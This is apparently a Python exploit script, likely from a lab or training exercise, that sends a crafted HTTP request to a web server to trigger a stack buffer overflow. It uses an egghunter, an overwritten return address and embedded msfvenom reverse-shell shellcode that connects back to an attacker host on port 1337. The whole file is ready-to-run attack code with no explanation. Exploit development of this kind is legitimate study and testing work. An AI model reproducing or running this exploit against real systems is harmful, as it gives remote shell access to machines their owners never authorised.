#!/usr/bin/env python3

import socket
import sys
import keystone
import subprocess
from struct import pack

try:
    if len(sys.argv) < 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]
    port = 80
    size = 260
    bad_char_values = b"\x00\x25\x0a\x0d"
    eip_offset = 253

    # Egghunter code.
    CODE = (
        # We use the edx register as a memory page counter
        "							 "
        "	loop_inc_page:			 "
        # Go to the last address in the memory page
        "		or dx, 0x0fff		;"
        "	loop_inc_one:			 "
        # Increase the memory counter by one
        "		inc edx				;"
        "	loop_check:				 "
        # Save the edx register which holds our memory 
        # address on the stack
        "		push edx			;"
        # Push the negative value of the system 
        # call number
        "		mov eax, 0xfffffe3a	;"
        # Initialize the call to NtAccessCheckAndAuditAlarm
        "		neg eax				;"
        # Perform the system call
        "		int 0x2e			;"
        # Check for access violation, 0xc0000005 
        # (ACCESS_VIOLATION)
        "		cmp al,05			;"
        # Restore the edx register to check 
        # later for our egg
        "		pop edx				;"
        "	loop_check_valid:		 "
        # If access violation encountered, go to n
        # ext page
        "		je loop_inc_page	;"
        "	is_egg:					 "
        # Load egg (w00t in this example) into 
        # the eax register
        "		mov eax, 0x74303077	;"
        # Initializes pointer with current checked 
        # address 
        "		mov edi, edx		;"
        # Compare eax with doubleword at edi and 
        # set status flags
        "		scasd				;"
        # No match, we will increase our memory 
        # counter by one
        "		jnz loop_inc_one	;"
        # First part of the egg detected, check for 
        # the second part
        "		scasd				;"
        # No match, we found just a location 
        # with half an egg
        "		jnz loop_inc_one	;"
        "	matched:				 "
        # The edi register points to the first 
        # byte of our buffer, we can jump to it
        "		jmp edi				;"
    )

    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
    encoding, count = ks.asm(CODE)
    egghunter = b""
    for code in encoding:
        egghunter += code.to_bytes(1, "little")

    # Jump to the first stage.
    # httpMethod = b"\X89\XE1"  # mov ecx,esp
    httpMethod = b"\x31\xC0"  # xor eax,eax
    httpMethod += b"\x89\x23"  # mov [ebx],esp
    httpMethod += b"\x03\x03"  # add eax,[ebx]
    httpMethod += b"\x83\xC0\x46"  # add eax,byte +0x46
    httpMethod += b"\x83\xC0\x23"  # add eax,byte +0x23
    httpMethod += b"\x50"  # push eax"
    httpMethod += b"\xC3"  # ret
    httpMethod += b" /"

    # Execute egghunter
    inputBuffer = b"\x90" * 4
    inputBuffer += egghunter
    inputBuffer += b"\x41" * (eip_offset - len(inputBuffer))

    # EIP control To pop return -> 0x0041eb74
    inputBuffer += b"\x74\xeb\x41"

    httpEndRequest = b"\r\n\r\n"

    # Payload
    httpEndRequest += b"w00tw00t"
    httpEndRequest += b"\x90" * 32  # NOP sled

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.185 LPORT=1337 -f python -b "\x00\x25\x0a\x0d" -o shellcode.txt 
    buf = b""
    buf += b"\xd9\xc2\xba\x4d\xc7\xd3\xa0\xd9\x74\x24\xf4\x5e\x29"
    buf += b"\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc\x03\x1b\xd4\x31"
    buf += b"\x55\x5f\x32\x37\x96\x9f\xc3\x58\x1e\x7a\xf2\x58\x44"
    buf += b"\x0f\xa5\x68\x0e\x5d\x4a\x02\x42\x75\xd9\x66\x4b\x7a"
    buf += b"\x6a\xcc\xad\xb5\x6b\x7d\x8d\xd4\xef\x7c\xc2\x36\xd1"
    buf += b"\x4e\x17\x37\x16\xb2\xda\x65\xcf\xb8\x49\x99\x64\xf4"
    buf += b"\x51\x12\x36\x18\xd2\xc7\x8f\x1b\xf3\x56\x9b\x45\xd3"
    buf += b"\x59\x48\xfe\x5a\x41\x8d\x3b\x14\xfa\x65\xb7\xa7\x2a"
    buf += b"\xb4\x38\x0b\x13\x78\xcb\x55\x54\xbf\x34\x20\xac\xc3"
    buf += b"\xc9\x33\x6b\xb9\x15\xb1\x6f\x19\xdd\x61\x4b\x9b\x32"
    buf += b"\xf7\x18\x97\xff\x73\x46\xb4\xfe\x50\xfd\xc0\x8b\x56"
    buf += b"\xd1\x40\xcf\x7c\xf5\x09\x8b\x1d\xac\xf7\x7a\x21\xae"
    buf += b"\x57\x22\x87\xa5\x7a\x37\xba\xe4\x12\xf4\xf7\x16\xe3"
    buf += b"\x92\x80\x65\xd1\x3d\x3b\xe1\x59\xb5\xe5\xf6\x9e\xec"
    buf += b"\x52\x68\x61\x0f\xa3\xa1\xa6\x5b\xf3\xd9\x0f\xe4\x98"
    buf += b"\x19\xaf\x31\x0e\x49\x1f\xea\xef\x39\xdf\x5a\x98\x53"
    buf += b"\xd0\x85\xb8\x5c\x3a\xae\x53\xa7\xad\x11\x0b\x96\x94"
    buf += b"\xfa\x4e\xd8\xe3\xc3\xc7\x3e\x81\x23\x8e\xe9\x3e\xdd"
    buf += b"\x8b\x61\xde\x22\x06\x0c\xe0\xa9\xa5\xf1\xaf\x59\xc3"
    buf += b"\xe1\x58\xaa\x9e\x5b\xce\xb5\x34\xf3\x8c\x24\xd3\x03"
    buf += b"\xda\x54\x4c\x54\x8b\xab\x85\x30\x21\x95\x3f\x26\xb8"
    buf += b"\x43\x07\xe2\x67\xb0\x86\xeb\xea\x8c\xac\xfb\x32\x0c"
    buf += b"\xe9\xaf\xea\x5b\xa7\x19\x4d\x32\x09\xf3\x07\xe9\xc3"
    buf += b"\x93\xde\xc1\xd3\xe5\xde\x0f\xa2\x09\x6e\xe6\xf3\x36"
    buf += b"\x5f\x6e\xf4\x4f\xbd\x0e\xfb\x9a\x05\x3e\xb6\x86\x2c"
    buf += b"\xd7\x1f\x53\x6d\xba\x9f\x8e\xb2\xc3\x23\x3a\x4b\x30"
    buf += b"\x3b\x4f\x4e\x7c\xfb\xbc\x22\xed\x6e\xc2\x91\x0e\xbb"

    httpEndRequest += buf
    httpEndRequest += b"\x90" * 128
    payload = httpMethod + inputBuffer + httpEndRequest

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
